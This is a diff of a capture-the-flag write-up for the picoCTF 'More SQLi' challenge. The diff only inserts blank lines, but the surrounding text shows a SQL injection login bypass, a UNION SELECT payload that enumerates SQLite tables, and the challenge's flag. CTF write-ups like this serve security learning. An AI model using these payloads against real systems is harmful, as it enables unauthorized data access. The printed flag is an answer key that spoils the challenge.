@@ -6,6 +6,7 @@ category: "Security/Practice/PicoCTF/Web"
 ---
 
 # PicoCTF - More SQLi
+
 ## Background
 * [Feifei Lab](https://lab.feifei.tw/practice/sqli/sql4.php)
 * Hint SQLiLite
@@ -18,6 +19,7 @@ Password: `' or '1'='1' -- #`
 
 ---
 ![](https://hackmd.io/_uploads/Bki0WoLd3.png)
+
 ## Exploit - SQLi(Union Selection)
 現在的目標是flag應該是藏在別的table，所以先找甚麼table
 1. 找table
@@ -37,6 +39,7 @@ Payload: `Algiers' union SELECT sql,sql,1 FROM sqlite_master WHERE type='table';
     ![](https://hackmd.io/_uploads/ryonEoIdn.png)
     :::
     Flag: `picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_98236ce6}`
+
 ## Reference
 [ picoCTF 2023 More SQLi ](https://youtu.be/W1EjP6OFpUQ)
 [Kaibro - SQLi](https://github.com/w181496/Web-CTF-Cheatsheet#sqlite)
